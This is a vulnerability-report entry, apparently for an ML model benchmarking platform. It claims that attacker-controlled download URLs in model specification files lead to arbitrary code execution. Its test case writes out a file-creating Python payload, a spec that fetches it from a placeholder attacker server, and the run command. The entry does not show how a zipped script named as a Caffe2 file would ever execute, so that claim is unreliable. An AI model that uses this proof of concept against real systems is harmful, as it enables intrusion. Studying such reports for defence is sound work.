### Vulnerability List

- Vulnerability Name: **Model Specification Injection leading to Arbitrary Code Execution**
- Description:
    1. An attacker crafts a malicious model specification JSON file.
    2. Within this specification, the attacker provides a download link (`location`) that points to a file hosted on a malicious third-party storage. This file is disguised as a legitimate model file but contains executable code or scripts.
    3. The victim user, intending to benchmark a model, uses this malicious specification file with the benchmarking platform.
    4. The benchmarking platform, as designed, downloads the file from the attacker-controlled URL to the local model cache.
    5. If the attacker bypasses or compromises the MD5 hash check (see mitigation analysis), the benchmarking platform proceeds to process the downloaded file.
    6. During the "processing" phase, which might involve framework-specific loading or initialization of the model, the malicious code embedded in the downloaded file gets executed on the benchmarking system.
- Impact:
    - **Critical**: Arbitrary code execution on the benchmarking system. This can lead to complete system compromise, data theft, installation of malware, or denial of service.
- Vulnerability Rank: **Critical**
- Currently Implemented Mitigations:
    - **MD5 Hash Verification**: The system downloads models based on URLs specified in JSON specifications and verifies the MD5 hash of the downloaded file against the hash provided in the specification. This is intended to ensure model integrity. (Source: `/code/README.md`, `/code/benchmarking/download_benchmarks/download_benchmarks.py`)
- Missing Mitigations:
    - **Input Validation and Sanitization**: Lack of robust validation of model specification files beyond MD5 hash check. The system should validate the structure and content of the specification files to prevent injection of malicious commands or scripts.
    - **Sandboxing or Isolation**: The benchmarking process, especially model loading and processing, is not sandboxed or isolated. This allows any malicious code within a compromised model to directly interact with the system.
    - **Code Review and Security Audits**: Missing regular code reviews and security audits specifically focusing on the model specification handling and download mechanisms.
- Preconditions:
    1. The attacker needs to host a malicious file on a third-party storage that can be accessed via a URL.
    2. The attacker needs to create a malicious model specification JSON file that includes the URL to the malicious file and a corresponding (potentially fake or compromised) MD5 hash.
    3. The victim user must be tricked into using this malicious model specification file, for example, by downloading it from an untrusted source or by social engineering.
- Source Code Analysis:
    1. **`/code/benchmarking/download_benchmarks/download_benchmarks.py`**:
        - `DownloadBenchmarks.downloadFile(self, location, md5)` function is responsible for downloading model files.
        - It checks if a file exists in the local cache and if the provided `md5` matches the cached file's MD5.
        - If the MD5 doesn't match or the file is not in the cache, it proceeds to download the file using `DownloadFile` class.
        - **Vulnerability Point**: While MD5 hash verification is implemented, if an attacker can provide a malicious model file along with its MD5 hash (e.g., by compromising a third-party storage or using a man-in-the-middle attack during hash retrieval if it's also downloaded), the system will trust the file after MD5 verification and proceed with processing, potentially executing malicious code.

    2. **`/code/benchmarking/run_bench.py`, `/code/benchmarking/harness.py`**:
        - These scripts are the main entry points for running benchmarks.
        - `run_bench.py` parses command line arguments and loads configurations.
        - `harness.py` orchestrates the benchmark execution, including model loading and framework interaction.
        - **Vulnerability Point**: These scripts use the downloaded model files as specified in the benchmark JSON. If a malicious model is downloaded due to a compromised specification, these scripts will unknowingly use it, leading to potential code execution during model loading or processing by the ML framework.

    3. **`/code/specifications/models/caffe2/squeezenet/squeezenet.json`** (Example Model Specification):
        ```json
        {
          "model": {
            "category": "CNN",
            "description": "SqueezeNet v1.1",
            "files": {
              "init": {
                "filename": "init_net.pb",
                "location": "https://...",  // Potentially malicious URL
                "md5": "...", // Compromised MD5 hash
              },
              "predict": {
                "filename": "predict_net.pb",
                "location": "https://...",  // Potentially malicious URL
                "md5": "...", // Compromised MD5 hash
              }
            },
            "format": "caffe2",
            "kind": "deployment",
            "name": "squeezenet"
          },
          "tests": [...]
        }
        ```
        - **Vulnerability Point**: The `location` field in the model specification is directly used to download files. There is no validation on the URL itself (e.g., allowed domains, protocols) or the file type being downloaded.

- Security Test Case:
    1. **Setup Malicious Model**: Create a simple Python script `malicious_model.py` that will be hosted as a "model file". This script should contain code to execute a command on the system, for example, creating a file in `/tmp`.
        ```python
        # malicious_model.py
        import os
        os.system('touch /tmp/attack_success.txt')
        print("Malicious code executed!")
        ```
        Zip this script to create `malicious_model.zip`.
    2. **Host Malicious Model**: Host `malicious_model.zip` on a publicly accessible web server (e.g., using a service like Python's `http.server` for testing purposes). Get the URL of this hosted zip file.
    3. **Craft Malicious Specification**: Create a model specification JSON file (e.g., `malicious_spec.json`) that points to the hosted `malicious_model.zip` URL. Generate the MD5 hash of `malicious_model.zip` and include it in the specification.
        ```json
        {
          "model": {
            "category": "Malicious",
            "description": "Malicious Model Specification",
            "files": {
              "predict": {
                "filename": "predict_net.pb",
                "location": "http://<attacker-server>/malicious_model.zip", // Replace with your malicious server URL
                "md5": "<MD5 hash of malicious_model.zip>" // Replace with the actual MD5 hash
              }
            },
            "format": "caffe2",
            "kind": "deployment",
            "name": "malicious_model"
          },
          "tests": [
            {
              "commands": [
                "{program} --net {files.predict} --warmup 1 --iter 1" // Minimal command
              ],
              "identifier": "malicious_test",
              "iter": 1,
              "metric": "delay",
              "warmup": 1
            }
          ]
        }
        ```
    4. **Run Benchmarking with Malicious Specification**: Execute the benchmarking platform using the crafted `malicious_spec.json` file.
        ```bash
        benchmarking/run_bench.py -b malicious_spec.json --model_cache /tmp/model_cache --info '{"treatment": {"programs": {}}}' --framework generic --platform host
        ```
    5. **Verify Exploit**: Check if the file `/tmp/attack_success.txt` has been created on the benchmarking system. If it exists, it confirms that the malicious code from `malicious_model.zip` was executed, demonstrating arbitrary code execution vulnerability. Also, check the output logs for "Malicious code executed!".

This vulnerability allows a remote attacker to achieve arbitrary code execution by providing a maliciously crafted model specification to a user of the benchmarking platform. The lack of proper input validation beyond MD5 hash checking and the absence of sandboxing are key factors contributing to this critical vulnerability.
